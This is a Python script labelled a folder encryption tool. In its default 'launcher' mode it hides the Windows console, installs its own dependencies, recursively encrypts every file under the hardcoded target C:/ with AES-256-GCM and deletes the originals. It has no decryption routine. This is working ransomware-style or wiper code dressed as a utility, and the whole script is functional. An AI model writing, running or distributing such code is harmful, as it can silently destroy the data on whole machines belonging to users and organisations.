#!/usr/bin/env python3
"""
Folder Encryption Tool (combined launcher + encryptor)

Recursively encrypts every file in a folder using AES-256-GCM
with PBKDF2-HMAC-SHA256 key derivation. Encrypted files get the
original filename + '.enc'.

Auto-installs the 'cryptography' dependency if missing.

On Windows, the console window is hidden and all output is written
to encrypt.log next to this script (launcher mode).

Usage:
    python encrypt_folder.py                                  # hardcoded settings
    python encrypt_folder.py <folder> <password> [--delete]   # CLI mode
"""

import ctypes
import os
import sys
import subprocess
import argparse
import importlib.util
from datetime import datetime
from pathlib import Path

# ===========================================================================
#  HARDCODED SETTINGS (used when no CLI args are given)
# ===========================================================================
TARGET_FOLDER   = r"C:/"    # "C:\\" or "C:/"
PASSWORD        = "password"
DELETE_ORIGINAL = True
# ===========================================================================

# Crypto constants
SALT_SIZE = 16          # bytes
NONCE_SIZE = 12         # bytes (GCM standard)
KEY_SIZE = 32           # 256-bit key
KDF_ITERATIONS = 480_000
MAGIC = b"ENCF"         # File header magic
VERSION = b"\x01"       # File format version
ENC_EXT = ".enc"

SCRIPT_DIR = Path(__file__).resolve().parent
LOG_PATH = SCRIPT_DIR / "encrypt.log"

# Modules required by this tool
REQUIRED_PACKAGES = {
    "cryptography": "cryptography",
}


# ---------------------------------------------------------------------------
# Dependency management
# ---------------------------------------------------------------------------
def _is_installed(module_name: str) -> bool:
    """Return True if the module can be found without importing it."""
    return importlib.util.find_spec(module_name) is not None


def _pip_install(package: str) -> bool:
    """Install a package via pip. Returns True on success."""
    print(f"[setup] Installing missing dependency: {package} ...")
    candidates = [
        [sys.executable, "-m", "pip", "install", "--upgrade", package],
        [sys.executable, "-m", "pip", "install", "--upgrade", "--user", package],
        [sys.executable, "-m", "pip", "install", "--upgrade",
         "--break-system-packages", package],  # PEP 668 (Debian/Ubuntu etc.)
    ]
    for cmd in candidates:
        try:
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
        except Exception as exc:
            print(f"[setup] Could not run pip: {exc}")
            continue
        if result.returncode == 0:
            print(f"[setup] Installed {package} successfully.")
            return True
        print(f"[setup] pip attempt failed (rc={result.returncode}). "
              f"Trying next method...")
    return False


def ensure_dependencies() -> None:
    """
    Verify required packages are installed; auto-install any that are missing.
    Exits with an error message if installation cannot be completed.
    """
    missing = [pkg for mod, pkg in REQUIRED_PACKAGES.items()
               if not _is_installed(mod)]

    if not missing:
        return

    print(f"[setup] Missing dependencies: {', '.join(missing)}")

    # Ensure pip itself is available
    if subprocess.run(
        [sys.executable, "-m", "pip", "--version"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    ).returncode != 0:
        print("[setup] pip is not available; attempting to bootstrap it...")
        try:
            subprocess.run(
                [sys.executable, "-m", "ensurepip", "--upgrade"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception:
            pass

    for pkg in missing:
        if not _pip_install(pkg):
            sys.exit(
                f"ERROR: could not install required package '{pkg}'.\n"
                f"       Please install it manually:  "
                f"{sys.executable} -m pip install {pkg}"
            )

    # Verify imports now work
    for mod, pkg in REQUIRED_PACKAGES.items():
        try:
            importlib.import_module(mod)
        except Exception as exc:
            sys.exit(
                f"ERROR: '{pkg}' is installed but failed to import: {exc}"
            )


# ---------------------------------------------------------------------------
# Console handling
# ---------------------------------------------------------------------------
def hide_console() -> None:
    """Hide the console window on Windows (no-op elsewhere)."""
    if os.name != "nt":
        return
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Crypto imports (deferred until after ensure_dependencies())
# ---------------------------------------------------------------------------
def _crypto():
    """Lazily import the cryptography primitives."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    return AESGCM, PBKDF2HMAC, hashes


# ---------------------------------------------------------------------------
# Key derivation
# ---------------------------------------------------------------------------
def derive_key(password: str, salt: bytes) -> bytes:
    """Derive a 256-bit key from password + salt using PBKDF2-HMAC-SHA256."""
    _, PBKDF2HMAC, hashes = _crypto()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_SIZE,
        salt=salt,
        iterations=KDF_ITERATIONS,
    )
    return kdf.derive(password.encode("utf-8"))


# ---------------------------------------------------------------------------
# File encryption
# ---------------------------------------------------------------------------
def encrypt_file(file_path: Path, password: str, delete_original: bool = False) -> Path:
    """Encrypt a single file. Returns the path of the encrypted file."""
    if file_path.suffix == ENC_EXT:
        print(f"  [skip] already encrypted: {file_path}")
        return file_path

    AESGCM, _, _ = _crypto()

    salt = os.urandom(SALT_SIZE)
    nonce = os.urandom(NONCE_SIZE)
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)

    plaintext = file_path.read_bytes()
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)

    out_path = file_path.with_suffix(file_path.suffix + ENC_EXT)
    with open(out_path, "wb") as f:
        # Layout: MAGIC | VERSION | SALT | NONCE | CIPHERTEXT
        f.write(MAGIC)
        f.write(VERSION)
        f.write(salt)
        f.write(nonce)
        f.write(ciphertext)

    if delete_original:
        file_path.unlink()

    print(f"  [enc] {file_path} -> {out_path.name}")
    return out_path


# ---------------------------------------------------------------------------
# Folder encryption
# ---------------------------------------------------------------------------
def encrypt_folder(folder: Path, password: str, delete_originals: bool = False) -> None:
    """Recursively encrypt all files in a folder."""
    if not folder.is_dir():
        raise NotADirectoryError(f"Not a directory: {folder}")

    files = [p for p in folder.rglob("*") if p.is_file() and p.suffix != ENC_EXT]
    print(f"Encrypting {len(files)} file(s) under {folder} ...")
    for f in files:
        try:
            encrypt_file(f, password, delete_original=delete_originals)
        except Exception as exc:
            print(f"  [error] {f}: {exc}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="AES-256-GCM folder encryption tool (encrypt only). "
                    "With no arguments, uses hardcoded settings and hides console."
    )
    parser.add_argument("folder", nargs="?", type=Path,
                        help="Folder to encrypt (default: hardcoded TARGET_FOLDER)")
    parser.add_argument("password", nargs="?",
                        help="Encryption password (default: hardcoded PASSWORD)")
    parser.add_argument("--delete", action="store_true",
                        help="Delete original files after successful encryption")
    return parser


def run_hardcoded() -> int:
    """Launcher mode: hide console, use hardcoded settings, log to file."""
    hide_console()

    folder = Path(TARGET_FOLDER).expanduser()
    if not folder.exists():
        return _log_and_exit(f"ERROR: folder not found: {folder}", 1)
    if not folder.is_dir():
        return _log_and_exit(f"ERROR: not a directory: {folder}", 1)
    if not PASSWORD:
        return _log_and_exit("ERROR: PASSWORD is empty in the script", 1)

    with open(LOG_PATH, "a", encoding="utf-8") as log:
        log.write(f"\n--- {datetime.now()} ---\n")
        log.write(f"folder: {folder}\n")
        log.flush()
        old_out, old_err = sys.stdout, sys.stderr
        sys.stdout = sys.stderr = log
        try:
            encrypt_folder(folder, PASSWORD, DELETE_ORIGINAL)
            return 0
        except KeyboardInterrupt:
            log.write("Interrupted.\n")
            return 130
        except Exception as exc:
            log.write(f"ERROR: {exc}\n")
            return 1
        finally:
            sys.stdout, sys.stderr = old_out, old_err


def _log_and_exit(msg: str, code: int) -> int:
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as log:
            log.write(f"\n--- {datetime.now()} ---\n{msg}\n")
    except Exception:
        pass
    print(msg, file=sys.stderr)
    return code


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    # Make sure dependencies exist before doing anything else.
    ensure_dependencies()

    # Launcher mode: no folder/password provided -> use hardcoded settings
    if args.folder is None or args.password is None:
        sys.exit(run_hardcoded())

    # CLI mode: explicit folder + password
    try:
        encrypt_folder(args.folder, args.password, args.delete)
    except Exception as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()